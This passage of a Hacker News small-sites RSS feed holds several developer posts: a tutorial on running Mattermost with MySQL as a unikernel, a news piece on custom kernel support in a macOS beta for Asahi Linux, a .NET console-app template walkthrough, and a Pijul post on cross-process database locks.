2021-01-11T17:45:55.112817Z 0 [Note]   - '0.0.0.0' resolves to '0.0.0.0';
2021-01-11T17:45:55.114596Z 0 [Note] Server socket created on IP: '0.0.0.0'.
2021-01-11T17:45:55.116577Z 0 [Warning] Insecure configuration for --pid-file: Location '/var/lib/mysql' in the path is accessible to all OS users. Consider choosing a different directory.
2021-01-11T17:45:55.136775Z 0 [Note] Event Scheduler: Loaded 0 events
2021-01-11T17:45:55.138651Z 0 [Note] mysqld: ready for connections.
Version: '5.7.29-0ubuntu0.18.04.1-log'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  (Ubuntu)
</code></pre>

<p>We should be able to connect to the server and create a mattermost
database:</p>

                <pre><code>mysql -u root -h 192.168.42.19
create datbase mattermost;</code></pre>

<p>Ops load by default will re-build the image each time so if you want
to skip that you can pass the '-s' flag or use 'ops instance create' instead.</p>

                <h3>Running MatterMost as a Unikernel</h3>

<p>For mattermost we'll want to edit the mattermost config.json (not to
be confused with the config.json we use for ops). Create a 'config'
directory to store it in. Copy the config.json in. If you want, you can
untar the tarball found in ~/.ops/packages/mattermost_5.12.0.tar.gz and grab a
copy there. Then you'll want to edit the mysql "DataSource" line in
config.json to modify the ip address and l/p:</p>

<pre><code>"DataSource": "root:root@tcp(192.168.42.19:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
</code></pre>

<p>Obviously this is just for demo purposes but as a side note - if you
do accidently deploy this to a public ip with default credentials the
bots that scour the internet looking for these things will be able to
connect and write all the SQL their little bot hearts desire, but their
db encryption operations fail, the cryptojacking
fails, and all the C&amp;C stuff fails. It just shows you how interesting
this style of architecture truly is.</p>

<p>Now let's load up mattermost and give it it's own tap and assign it a static ip address:</p>

                <pre><code>➜ ops load mattermost_5.12.0 -c config.json -p 8065 -b -t tap1 --ip-address 192.168.42.20
warning: overwriting existing file /config/config.json hostpath old: /home/eyberg/.ops/.staging/mattermost_5.12.0/sysroot/config/config.json new: config/config.json
[mattermost -c config/config.json --disableconfigwatch]
booting /home/eyberg/.ops/images/mattermost.img ...
assigned: 192.168.42.20
{"level":"info","ts":1610387180.047103,"caller":"utils/i18n.go:83","msg":"Loaded system translations for 'en' from '/i18n/en.json'"}
{"level":"info","ts":1610387180.0498981,"caller":"app/server_app_adapters.go:58","msg":"Server is initializing..."}
{"level":"error","ts":1610387180.0560362,"caller":"app/server_app_adapters.go:69","msg":"Failed to parse server templates function not implemented"}
{"level":"info","ts":1610387180.0593297,"caller":"sqlstore/supplier.go:224","msg":"Pinging SQL master database"}
{"level":"info","ts":1610387180.231293,"caller":"sqlstore/upgrade.go:104","msg":"The database schema has been set to version 5.12.0"}
{"level":"error","ts":1610387204.4853191,"caller":"app/server_app_adapters.go:125","msg":"SiteURL must be set. Some features will operate incorrectly if the SiteURL is not set. See documentation for details: http://about.mattermost.com/default-site-url"}
{"level":"info","ts":1610387204.5032592,"caller":"filesstore/localstore.go:33","msg":"Able to write files to local storage."}
{"level":"info","ts":1610387204.7344124,"caller":"app/license.go:41","msg":"License key from https://mattermost.com required to unlock enterprise features."}
{"level":"info","ts":1610387204.982482,"caller":"app/migrations.go:26","msg":"Migrating roles to database."}
{"level":"info","ts":1610387208.7359424,"caller":"sqlstore/post_store.go:1277","msg":"Post.Message supports at most 16383 characters (65535 bytes)"}
{"level":"info","ts":1610387209.2314367,"caller":"app/migrations.go:102","msg":"Migrating emojis config to database."}
{"level":"info","ts":1610387246.2326972,"caller":"mlog/log.go:164","msg":"Starting up plugins"}
{"level":"info","ts":1610387246.241575,"caller":"app/server.go:213","msg":"Current version is 5.12.0 (5.12.0/Sat Jun 15 09:02:50 UTC 2019/bfd66aa445a2df8c6ed6b a9f2567021ecf6c9f3b/403add5df2a572f676fd9da85ad80623cb00b88a)"}
{"level":"info","ts":1610387246.2597792,"caller":"app/server.go:214","msg":"Enterprise Enabled: true"}
{"level":"info","ts":1610387246.267642,"caller":"app/server.go:216","msg":"Current working directory is /"}
{"level":"info","ts":1610387246.276085,"caller":"app/server.go:217","msg":"Loaded config","source":"file:///config/config.json"}
{"level":"info","ts":1610387246.9817462,"caller":"jobs/workers.go:68","msg":"Starting workers"}
{"level":"info","ts":1610387246.989871,"caller":"app/server.go:413","msg":"Starting Server..."}
{"level":"info","ts":1610387246.9986944,"caller":"app/server.go:479","msg":"Server is listening on [::]:8065"}
{"level":"info","ts":1610387247.0144029,"caller":"jobs/schedulers.go:72","msg":"Starting schedulers."}
{"level":"info","ts":1610387247.0446193,"caller":"app/web_hub.go:75","msg":"Starting 2 websocket hubs"}
</code></pre>

<p>If everything works you'll see the login/setup page for mattermost!</p>

            <center><img src="https://nanovms.com/static/dist/img/tutorials/mattermost.png"></center>

      </div></div>]]>
            </description>
            <link>https://nanovms.com/dev/tutorials/running-mattermost-as-unikernel</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792618</guid>
            <pubDate>Fri, 15 Jan 2021 16:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[macOS beta adds custom kernel support, closer to installing other OSS on M1 Macs]]>
            </title>
            <description>
<![CDATA[
Score 56 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25792565">thread link</a>) | @CharlesW
<br/>
January 15, 2021 | https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/ | <a href="https://web.archive.org/web/*/https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Two weeks ago, security researcher and developer Hector Martin (@marcan42 on Twitter), <a href="https://the8-bit.com/asahi-is-a-novel-project-with-the-goal-of-porting-linux-to-m1-macs/">kicked off an ambitious project</a> with the goal of natively bringing Linux to <a href="https://the8-bit.com/which-m1-apple-silicon-macbook-you-should-buy/">Apple Silicon Macs</a>. The operating system-to-be is called Asahi Linux and apparently today, the project experienced its first breakthrough.</p>
<p>Apple released the second beta of macOS Big Sur 11.2 yesterday. It’s an incremental upgrade that does not necessarily bring grandiose novelty to the table. Instead, as it goes, beta versions often do introduce a lot of under-the-hood features. And one of those features was custom kernel support, as noted by Hector himself.</p>
<p>A kernel is one of the most important aspects of an operating system that has absolute control over everything happening inside a computer. It is a cog that is responsible for interactions between hardware and software components.</p>
<p>That said, support for custom kernels might not excite you, per se. But if you’re dedicated to reverse-engineer Apple’s software for Macs, it’s a pretty big deal. Custom kernels are essentially modified stock kernels. You can add your own features to the modified kernel that the manufacturer does not ship in its own, which means you can make a computer do things it wasn’t originally intended to do.</p>
<p>According to Hector, thanks to kernel support in the latest macOS beta, “the OS now finally includes the firmware and bootloaders and tools necessary to replace Big Sur with not-Big-Sur. That was previously not possible.” He also shared a clip of his MacBook Air displaying the Asahi Linux bootloader:</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>It's happening.</p><p>macOS Big Sur 11.2 beta 2 is out with full custom kernel support.</p><p>Expect a fun early bring-up stream tomorrow. Time to get a few hours of sleep. <a href="https://t.co/Ujq159DqWQ" target="_blank">pic.twitter.com/Ujq159DqWQ</a></p></div>— Hector Martin (@marcan42) <a href="https://twitter.com/marcan42/status/1349478954982232064?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 13, 2021</a></blockquote>
</div></figure>
<p>A bootloader, for instance, is an integral part of powering up your machine. It handles the boot order of operating systems on a machine. Each machine has a bootloader that’s specific to it and gaining control over it is an important step towards installing an entirely different operating system.</p>
<p>Despite the new improvements, it might take some time for a native Linux installation on an M1 Mac to realize and be ready for public distribution. Aside from the custom kernel support, the developers on the Asahi Linux project still need to work on developing drivers for the operating system.</p><div><p>See also</p><div id="block-wrap-10599" data-id="10599" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/macbook-pro-and-ipad-pro-with-mini-led-displays-coming-in-the-first-half-of-2021/" title="iPad-Pro-1"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-100x100.jpg" alt="iPad Pro 1" srcset="https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-80x80.jpg 80w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-432x432.jpg 432w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-529x529.jpg 529w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-724x724.jpg 724w, https://the8-bit.com/wp-content/uploads/2020/11/iPad-Pro-1-1039x1039.jpg 1039w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>Back in November 2020, Apple’s VP of Software Engineering Craig Federighi said <a aria-label="in an interview with Ars Technica (opens in a new tab)" href="https://arstechnica.com/gadgets/2020/11/we-are-giddy-interviewing-apple-about-its-mac-silicon-revolution/" target="_blank" rel="noreferrer noopener">in an interview with Ars Technica</a> that when it comes to Windows running natively on an M1 Mac, “that’s really up to Microsoft. We have the core technologies for them to do that, to run their ARM version of Windows, which in turn of course supports x86 user-mode applications. But that’s a decision Microsoft has to make, to bring to license that technology for users to run on these Macs. But the Macs are certainly very capable of it.”</p>
<p>The newly added support for custom kernels on Big Sur’s 11.2 Beta 2 may also set a precedent for Microsoft to make the ARM version of Windows available to M1 Mac users as an alternate operating system.</p>
<p>As we’ve noted before, Asahi Linux is an independent project that relies on people’s contributions to continue. You can either offer to volunteer your expertise to the project or contribute an amount to the <a aria-label="project's Patreon (opens in a new tab)" href="https://asahilinux.org/support/" target="_blank" rel="noreferrer noopener">project’s Patreon</a> to expedite the development.</p>
<p>Let us know your thoughts about this story in the comments section below.</p>
</div></div>]]>
            </description>
            <link>https://the8-bit.com/macos-big-sur-11-2-beta-2-brings-custom-kernel-support-putting-us-one-step-closer-to-installing-other-operating-systems-on-m1-macs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792565</guid>
            <pubDate>Fri, 15 Jan 2021 16:24:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My preferred .NET console stack]]>
            </title>
            <description>
<![CDATA[
Score 195 | Comments 109 (<a href="https://news.ycombinator.com/item?id=25792422">thread link</a>) | @devlead
<br/>
January 15, 2021 | https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack | <a href="https://web.archive.org/web/*/https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div id="content">
<p>There's type of application that has followed me since I learned to code in the mid-'80s, and that's the console application. For years they looked the same a <code>Main(string[] args)</code> and some naive inconsistent command line parser. That gradually improved with the adoption of various OSS helper libraries. In this post, I'll walk through what today is my alternative starting point to <code>dotnet new console</code>, a way that greatly reduces the boilerplate code needed for logging, parsing, and validation of arguments, letting me focus on the problem to solve and not the plumbing.</p>
<h2 id="templates">Templates</h2>
<p>A convenient way to scaffold a new project is using the template function of .NET SDK CLI, it comes preloaded with several templates like <code>console</code>, <code>classlib</code>, etc., but beyond that, it's possible to create your own templates, which I've for my and your convenience created, so given <a href="https://dotnet.microsoft.com/download/dotnet/5.0">.NET 5 SDK</a> installed, easily yourself can try and take a look at everything discussed in this post.</p>
<h2 id="devlead-console-template">Devlead Console Template</h2>
<p>So let's get started with creating a new console application according to my opinionated recipe, .NET SDK Templates are distributed as NuGet packages and the canonical source for NuGet packages is <a href="https://www.nuget.org/">NuGet.org</a>, where I've published my template as <a href="https://www.nuget.org/packages/Devlead.Console.Template/">Devlead.Console.Template</a>. Templates are installed using the <code>dotnet new</code> command with <code>--install packageId</code> parameter, in this case:</p>
<pre><code>dotnet new --install Devlead.Console.Template
</code></pre>
<h2 id="dotnet-new-devleadconsole">dotnet new devleadconsole</h2>
<p>With the template installed locally, we now have a new <code>devleadconsole</code> template at our disposal, to create our new console applications with according to me, essential dependencies and boilerplate code:</p>
<pre><code>dotnet new devleadconsole -n MyConsoleApp
</code></pre>
<p>The above command will in the current directory result in the below folder structure</p>
<pre><code>MyConsoleApp
    │   MyConsoleApp.csproj
    │   Program.cs
    │
    └───Commands
        │   ConsoleCommand.cs
        │
        ├───Settings
        │       ConsoleSettings.cs
        │
        └───Validation
                ValidateStringAttribute.cs
</code></pre>
<h2 id="myconsoleapp.csproj">MyConsoleApp.csproj</h2>
<p>The created project file will look something like below</p>
<pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net5.0&lt;/TargetFramework&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
    &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;PackageReference Include="Spectre.Console" Version="0.37.0" /&gt;
    &lt;PackageReference Include="Spectre.Cli.Extensions.DependencyInjection" Version="0.3.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging.Console" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.SourceLink.GitHub" Version="1.0.0" PrivateAssets="All"/&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;
</code></pre>
<p>let's step for step break it down</p>
<h3 id="outputtype">OutputType</h3>
<p><code>OutputType</code> with the value <code>exe</code>, indicates that this will be an executable.</p>
<h3 id="targetframework">TargetFramework</h3>
<p><code>TargetFramework</code> with the value <code>net5.0</code>, means that this will be compiled for/targeting .NET 5.</p>
<h3 id="nullable">Nullable</h3>
<p><code>Nullable</code> with the value <code>enable</code>, enables the <a href="https://docs.microsoft.com/en-us/dotnet/csharp/nullable-references">nullable reference types</a> feature that was introduced with C# 8, making reference types non-nullable by default, basically moving many errors from being caught late at runtime, to be caught early at compile time.</p>
<h3 id="treatwarningsaserrors">TreatWarningsAsErrors</h3>
<p><code>TreatWarningsAsErrors</code> with the value <code>true</code> makes the compiler grumpier, it won't just break the build for compiler errors, but also for compiler warnings, combined with <code>Nullable</code> I personally believe code quality gets better from the start.</p>
<h3 id="packagereferences">PackageReference(s)</h3>
<ul>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a></strong> is a lot of things, a true swiss army for anyone doing console applications, but in this template, it's foremost an extremely opinionated command-line parser.</li>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Cli.Extensions.DependencyInjection">Spectre.Cli.Extensions.DependencyInjection</a></strong> makes it easy for <a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a> to interop with standard <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.DependencyInjection/">Microsoft DependencyInjection</a></strong>, same as used by default for dependency injection with i.e. ASP .NET and Azure Functions.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging">Microsoft.Extensions.Logging</a></strong> simplified provides standard logging abstractions and <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging.Console">Microsoft.Extensions.Logging.Console</a></strong> provides an implementation for logging to the console.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.SourceLink.GitHub">Microsoft.SourceLink.GitHub</a></strong> enables automatic tracking between artifact and source control, providing a better debugging and traceability experience.</li>
</ul>
<h2 id="program.cs">Program.cs</h2>
<p>The generated <code>Program.cs</code> uses the new C#9 <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> pattern removing unnecessary ceremony code from the application, but what it does contain:</p>
<ol>
<li>using statements</li>
<li>Creating dependency injection container</li>
<li>Console logger registration</li>
<li>Hooking up dependency injection container with Spectre.Console</li>
<li>Spectre.Console command declaration</li>
<li>Execute the application</li>
</ol>
<blockquote>
<p>Note: <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> means as <code>RunAsync</code> returns a <code>Task&lt;int&gt;</code>, .NET 5 will automatically generate "<code>Program</code>" class and <code>async Task&lt;int&gt; Main(string args)</code> for you, removing the need to write a lot of boilerplate code.</p>
</blockquote>
<pre><code>using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Devlead.Console.Commands;
using Spectre.Console.Cli;
using Spectre.Cli.Extensions.DependencyInjection;

var serviceCollection = new ServiceCollection()
    .AddLogging(configure =&gt;
            configure
                .AddSimpleConsole(opts =&gt; {
                    opts.TimestampFormat = "yyyy-MM-dd HH:mm:ss ";
                })
    );

using var registrar = new DependencyInjectionRegistrar(serviceCollection);
var app = new CommandApp(registrar);

app.Configure(
    config =&gt;
    {
        config.ValidateExamples();

        config.AddCommand&lt;ConsoleCommand&gt;("console")
                .WithDescription("Example console command.")
                .WithExample(new[] { "console" });
    });

return await app.RunAsync(args);
</code></pre>
<h2 id="consolecommand.cs">ConsoleCommand.cs</h2>
<p><code>ConsoleCommand.cs</code> contains "just" your business code, <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> handles the heavy lifting of parsing and validating command-line arguments (<em>based on provided settings class, more on that later in the post.</em>), resolving constructor parameters using dependency injection, etc. Letting you focus on the domain and not the boilerplate code, resulting in a very similar experience to i.e. Azure Function or .NET Workers, enabling reuse of both patterns and code. <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> has support for both async and sync commands.</p>
<pre><code>using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using MyConsoleApp.Commands.Setting;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands
{
    public class ConsoleCommand : AsyncCommand&lt;ConsoleSettings&gt;
    {
        private ILogger Logger { get; }

        public override async Task&lt;int&gt; ExecuteAsync(CommandContext context, ConsoleSettings settings)
        {
            Logger.LogInformation("Mandatory: {Mandatory}", settings.Mandatory);
            Logger.LogInformation("Optional: {Optional}", settings.Optional);
            Logger.LogInformation("CommandOptionFlag: {CommandOptionFlag}", settings.CommandOptionFlag);
            Logger.LogInformation("CommandOptionValue: {CommandOptionValue}", settings.CommandOptionValue);
            return await Task.FromResult(0);
        }

        public ConsoleCommand(ILogger&lt;ConsoleCommand&gt; logger)
        {
            Logger = logger;
        }
    }
}
</code></pre>
<h2 id="consolesettings.cs">ConsoleSettings.cs</h2>
<p><code>ConsoleSettings.cs</code> contains the definition of what parameters each command has, if they're are mandatory/optional, positional and how they validated. It also contains metadata used for automatically generating help and error messages.</p>
<pre><code>using System.ComponentModel;
using Devlead.Console.Commands.Validate;
using Spectre.Console.Cli;

namespace Devlead.Console.Commands.Setting
{
    public class ConsoleSettings : CommandSettings
    {
        [CommandArgument(0, "&lt;mandatory&gt;")]
        [Description("Mandatory argument")]
        public string Mandatory { get; set; } = string.Empty;

        [CommandArgument(1, "[optional]")]
        [Description("Optional argument")]
        public string? Optional { get; set; }

        [CommandOption("--command-option-flag")]
        [Description("Command option flag.")]
        public bool CommandOptionFlag { get; set; }

        [CommandOption("--command-option-value &lt;value&gt;")]
        [Description("Command option value.")]
        [ValidateString]
        public string? CommandOptionValue { get; set; }
    }
}
</code></pre>
<h2 id="validatestringattribute.cs">ValidateStringAttribute.cs</h2>
<p><a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> can validate either by custom attributes on properties (<em>see <code>ConsoleSettings.CommandOptionValue</code> for an example of that</em>) or globally by overriding <code>Validate()</code> method on <code>CommandSettings</code>. The template ships with a sample <code>ValidateStringAttribute</code> that just validates the length of a string, but you can make it as advanced as you want.</p>
<pre><code>using Spectre.Console;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands.Validation
{
    public class ValidateStringAttribute : ParameterValidationAttribute
    {
        public const int MinimumLength = 3;

        public ValidateStringAttribute() : base(errorMessage: null)
        {
        }

        public override ValidationResult Validate(ICommandParameterInfo parameterInfo, object? value)
            =&gt; (value as string) switch {
                { Length: &gt;= MinimumLength }
                    =&gt; ValidationResult.Success(),

                { Length: &lt; MinimumLength }
                    =&gt; ValidationResult.Error($"{parameterInfo?.PropertyName} ({value}) needs to be at least {MinimumLength} characters long."),

                _ =&gt; ValidationResult.Error($"Invalid {parameterInfo?.PropertyName} ({value}) specified.")
            };
    }
}
</code></pre>
<h2 id="result">Result</h2>
<p><img src="https://cdn.devlead.se/clipimg-vscode/2021/01/15/devleadmyconsoleapp.gif?sp=rl&amp;st=2021-01-15T09:33:29Z&amp;se=2031-01-16T09:33:00Z&amp;sv=2019-12-12&amp;sr=b&amp;sig=fp8lXgfDwOgGkdK3cYm0fFojddT8ZEx7SJuiIMkIOW8%3D" alt="GIF animation of Console experience"></p>
<h2 id="conclusion">Conclusion</h2>
<p>This is my opinionated happy path for doing .NET Console applications, feel free to let me know if you've got your own recipe for success, but must say I'm really happy how this combination lets me write console applications in the same way as I do my .NET workers, Azure Functions, ASP .NET Core, etc. ensuring consistency, less duplication and good reuse of both patterns and code. There's a LOT more to <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> than command-line parsing, to I hight …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</a></em></p>]]>
            </description>
            <link>https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792422</guid>
            <pubDate>Fri, 15 Jan 2021 16:08:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing cross-process locks]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25790132">thread link</a>) | @gbrown_
<br/>
January 15, 2021 | https://pijul.org/posts/2021-01-15-sanakirja-locks/ | <a href="https://web.archive.org/web/*/https://pijul.org/posts/2021-01-15-sanakirja-locks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Friday, January 15, 2021</p><p>I just finished implementing a non-trivial bit of Pijul: cross-process locks for Sanakirja databases.
In this post, I explain how it works.</p><h2 id="the-problem">The problem</h2><p>Sanakirja is essentially a <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a> collection of <a href="https://en.wikipedia.org/wiki/B-tree">B trees</a> in a file. We can start <em>mutable</em> transactions, which allow us to change the database, and can be dropped (after which the database remains unmodified) or committed, and <em>immutable</em> transactions, which only allow us to read the database.</p><p>There are a few rules to prevent race conditions: there can only be one mutable transaction started at a time, and mutable transactions cannot start if an immutable transaction started before the last commit is still active.
In other words, the following scenarios are allowed: in these drawings, the green mutable transaction starts first, and the blue transaction starts after the commit of the green one. The pink immutable transaction starts before everything else. The pink transaction can continue even after the commit of the green transaction, and will read the database as it was before the green transaction started.</p><p>However, before starting the blue transaction, we must wait for the end of the pink one.</p><p><img src="https://pijul.org/img/concurrence0.svg"></p><p>As shown in the following drawing, it does not matter whether the pink transaction was started before or after the beginning of the green one:</p><p><img src="https://pijul.org/img/concurrence1.svg"></p><p>Another notable feature of this system is that another immutable transaction (drawn in orange in the below diagram) can even be started between the two mutable transactions, in parallel to the pink transaction. In that case, the orange and pink transactions will read <em>different versions</em> of the database.
This is allowed because the orange transaction starts <em>after</em> the commit of the green one.</p><p><img src="https://pijul.org/img/concurrence2.svg"></p><h2 id="implementation-of-the-trees">Implementation of the trees</h2><p>The size of nodes in the B tree is 4096 bytes, which is the size of memory pages on most platforms (<a href="https://www.oracle.com/technetwork/server-storage/sun-sparc-enterprise/documentation/sparc-arch-2007-2516668.pdf">UltraSPARC</a> being an exception, with 8192 bytes pages).</p><p><a href="https://pirl.nvsl.io/PIRL2019-content/PIRL-2019-Andy-Rudoff.pdf">Pages are often considered to synchronise to disk <em>atomically</em></a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, even though larger chunks might only be partially synchronised. This is why it is always safe to choose a smaller block size than the page size of the platform: the larger pages on UltraSPARC will be slower to synchronise, but that synchronisation will still happen atomically, thanks to disk caches.</p><p>In Sanakirja, the first page contains pointers to (1) the list of free pages and (2) a collections of at most 500 different pointers to B trees.</p><p>In a mutable transaction, existing pages are not modified: they are instead <em>copied</em> to a newly allocated page. This sounds horrible in terms of performance, but it is not that bad in practice, since we have to copy these pages to memory anyway before we can access them in the program, and write them back to disk after modifying them, and these synchronous input/output operations are much more expensive than copying page-size blocks, even on SSDs.</p><h2 id="cross-process-locks">Cross process locks</h2><p><a href="https://pijul.org/posts/2019-03-20-sanakirja-0.10/#the-concurrency-model">I wrote before about the lock model of Sanakirja</a>, but this was limited to the scope of a single process, and was relying on file locks to work, in the sense that any process using Sanakirja would first have to take an exclusive file lock, and then use the correct concurrency model between threads inside a process.</p><p>However, Pijul sometimes needs a bit more than this: for example, <a href="https://nest.pijul.com/cole-h">@cole-h</a> reported in issue <a href="https://nest.pijul.com/pijul/pijul/discussions/43">#43</a> that <code>pijul record</code> locked up other commands, which was inconvenient if you wanted to open a log while editing a change.</p><p>It is of course fundamental to prevent two records, or a record and a pull, to happen in parallel, but a full exclusive lock was clearly too much.</p><p>The system needs three atomic variables in order to work:</p><ul><li>A global clock, incremented at each commit.</li><li>A counter of active immutable transactions.</li><li>A counter of transactions active during the last commit. This is useful to make the difference between the pink and orange transactions in the drawings above.</li></ul><p>Each immutable transaction remembers the value of the clock at the time it starts, and increments the active transaction counter. When it stops, it decrements the counter of active immutable transactions, and if it started before the last commit, also decrements the counter of transactions active during the last commit.</p><p>I considered two different systems to implement this in a cross-process way:</p><ol><li><p>Reading and updating all these values at once to a file at each operation (maybe using shared memory), where the file would be protected by a lock (or a named mutex or semaphore). This sounds feasible in principle, but there is a catch: at the end of the last immutable transaction that was started before the last commit, we need a mechanism to signal to a potential mutable transaction that it can start. Between threads, this is achieved with condition variables. Between processes, this is more complicated: we could use Unix signals, but their handlers can interrupt any running function, which means that these handlers cannot take any mutex, and cannot talk to Tokio at all, which limits their usefulness.</p></li><li><p>The other option, which I ended up implementing, is to write a barebones implementation of the locking model in an external process, using Tokio tasks to model transactions, and communicate with that Tokio runtime with Unix Domain Sockets. Every time a transaction starts, it tries to connect to a Unix Domain Socket at a specified location. If that fails, a new process is forked, to run the <code>pijul lock</code> hidden command in the background (using <a href="https://doc.rust-lang.org/std/process/struct.Command.html#method.spawn">std::process::Command::spawn</a>), which opens a Unix Domain Socket and prints a new line to its standard output. The parent process waits for that newline, and then connects to the socket. The <code>pijul lock</code> command then works as follows:</p></li></ol><ul><li>The protocol implemented over the UDS has three commands (start an immutable transaction, start a mutable transaction, and commit), and two answers (called <code>ack</code> and <code>locked</code>). All these messages are encoded on one byte.</li><li>The caller use Tokio IO to wait for a response.</li><li>When the last client disconnects from the socket, <code>pijul lock</code> waits for one second, checks whether there are other clients, and then exits if there are none. This delay avoids starting instances of <code>pijul lock</code> over and over again when using pijul in a script.</li></ul><p>The source code for that new command can be seen <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.BQOAA">here on the Nest</a>, and the source code for the two kinds of transactions is available <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.UQDQA">here, also on the Nest</a>.</p><h2 id="conclusion">Conclusion</h2><p>First, this only works on Unix platforms at the moment, but it seems the equivalent of UDS on Windows <a href="https://github.com/tokio-rs/tokio/issues/2201">might be implemented soon in Tokio</a>. Pijul on Windows still relies on standard file locks.</p><p>Moreover, this is implemented in Pijul at the moment, not in Libpijul, because Libpijul is not meant to depend on Tokio in the long run (that dependency will be dropped before the beta of 1.0).</p><p>A finaly thing to note is that file locks are advisory, and so is this external process. This means that they are safe to use as long as all processes that write to the database are aware of them. However, as is the case for all files in a filesystem, a process that refuses to cooperate, and has write access to a file, will always be able to corrupt it.</p><h2 id="discussions">Discussions</h2><ul><li><a href="https://www.reddit.com/r/rust/comments/kxt19w/crossprocess_locks_between_transactions_in/">On Reddit</a></li><li><a href="https://pijul.zulipchat.com/">On Zulip</a></li></ul><section role="doc-endnotes"><hr><ol><li id="fn:1" role="doc-endnote"><p>Thanks to HackerNews user @vlowther for pointing out an oversimplification in an earlier version of this post. Sanakirja relies on the atomicity of $24 + 8r$ bytes, where $r$ is the number of “root” tables. In most cases, this is way less than 4Kb. When loads of tables are needed, Sanakirja can represent “tables of tables, indexed for example by an integer” (this has the Rust type <code>Db&lt;u64, Db&lt;K, V&gt;&gt;</code>), using a single root table, in which case the atomicity requirement falls down to 32 bytes. <a href="#fnref:1" role="doc-backlink">↩︎</a></p></li></ol></section></div></div>]]>
            </description>
            <link>https://pijul.org/posts/2021-01-15-sanakirja-locks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790132</guid>
            <pubDate>Fri, 15 Jan 2021 12:27:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Program Eloquence Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25789837">thread link</a>) | @j-james
<br/>
January 15, 2021 | https://tilde.team/~kiedtl/blog/chatterbox/ | <a href="https://web.archive.org/web/*/https://tilde.team/~kiedtl/blog/chatterbox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<a id="homelink" href="https://tilde.team/~kiedtl/">⟵ Back</a><hr>


<p>Let's compare some error messages -- specifically, the ones that occur when
you try to execute a nonexistant command in Windows PowerShell and GNU
Bash.</p>
<p>PowerShell:</p>
<pre><code>PS C:\&gt; lorem --ipsum dolor -sit amet
